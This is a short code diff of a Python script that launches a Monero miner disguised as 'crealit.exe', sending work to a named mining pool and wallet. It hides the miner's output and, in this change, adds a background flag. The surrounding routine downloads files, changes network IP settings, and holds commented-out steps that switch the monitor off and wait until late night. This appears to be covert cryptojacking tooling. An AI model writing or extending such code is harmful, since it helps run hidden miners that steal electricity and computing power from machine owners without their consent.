@@ -182,7 +182,7 @@ def get_computer_description():
         return "sem_descricao"
 
 def ligar_crealit():
-    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 ', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --backgraund', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="255.255.255.0",
                   dns1="8.8.8.8", dns2="192.168.137.1", usar_powershell=True):
@@ -245,7 +245,7 @@ def main_slave():
     # if not is_after_23():
     #      return
     baixar_arquivos()
-    desligar_monitor() 
+    #desligar_monitor() 
     configurar_ip(usar_powershell=False)
     time.sleep(10)
     #restart_ethernet()
